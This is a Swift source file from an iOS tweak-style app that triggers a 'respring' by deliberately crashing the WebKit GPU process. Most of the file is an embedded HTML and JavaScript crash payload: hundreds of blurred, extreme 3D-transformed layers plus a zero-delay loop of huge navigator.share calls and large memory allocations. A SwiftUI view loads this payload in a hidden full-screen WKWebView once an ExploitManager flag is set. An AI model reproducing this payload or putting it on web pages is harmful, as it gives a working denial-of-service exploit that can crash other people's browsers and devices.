//
//  RespringController.swift
//  WorkPlot
//
//  NeoSpring-style instant respring (WebKit GPU crash). Web approach by
//  @neonmodder123, Swift port by @skadz108 (rooootdev/neospring). Mirrors
//  Ketamine's proven RespringHelper + NeoSpringView exactly — full-screen
//  WebView with no teardown timeout so the crash can complete.

import SwiftUI
import WebKit

private let crashHTML = #"""
<!DOCTYPE html>
<html>
  <body>
    <iframe id="frame" srcdoc="" sandbox="allow-forms allow-modals allow-orientation-lock allow-pointer-lock allow-popups allow-presentation allow-scripts"></iframe>
    <script>
      const frame = document.getElementById('frame');
      const payload = `
        <html>
          <body>
            <script>
              const container = document.createElement('div');
              container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%;';
              document.body.appendChild(container);

              for (let i = 0; i < 500; i++) {
                const layer = document.createElement('div');
                layer.style.cssText = 'position: absolute; width: 100vw; height: 100vh; backdrop-filter: blur(100px); -webkit-backdrop-filter: blur(100px); transform: translate3d(100000px, 100000px, ' + i + 'px) rotateY(90deg);';
                container.appendChild(layer);
              }

              setInterval(() => {
                navigator.share({ title: 'R', text: 'R'.repeat(100000) }).catch(() => {});
                const bytes = new Uint8Array(1024 * 1024 * 10);
                crypto.getRandomValues(bytes);
              }, 0);
            <\/script>
          </body>
        </html>
      `;
      frame.srcdoc = payload;
    </script>
  </body>
</html>
"""#

/// Full-screen respring transition presented over the app root while
/// `ExploitManager.respringRequested` is true. The WKWebView beneath it
/// triggers the WebKit GPU crash; the screen stays plain black so the crash
/// is never visibly rendered.
struct NeoSpringView: View {
    @State private var showsWebView = false

    var body: some View {
        Color.black
            .ignoresSafeArea()
            .overlay {
                if showsWebView {
                    NeoSpringWebView()
                        .brightness(-1)
                }
            }
            .task {
            // Overlay already shows the black screen. The crash WebView is only
            // mounted once the apply work is done (respringCrashArmed), then a
            // short delay so the screen is settled before the GPU crash fires.
            while !ExploitManager.shared.respringCrashArmed {
                try? await Task.sleep(for: .milliseconds(50))
                if Task.isCancelled { return }
            }
            try? await Task.sleep(for: .milliseconds(250))
            showsWebView = true
        }
    }
}

private struct NeoSpringWebView: UIViewRepresentable {
    func makeUIView(context: Context) -> WKWebView {
        let configuration = WKWebViewConfiguration()
        configuration.defaultWebpagePreferences.allowsContentJavaScript = true
        let webView = WKWebView(frame: .zero, configuration: configuration)
        webView.loadHTMLString(crashHTML, baseURL: nil)
        return webView
    }

    func updateUIView(_ webView: WKWebView, context: Context) {}
}
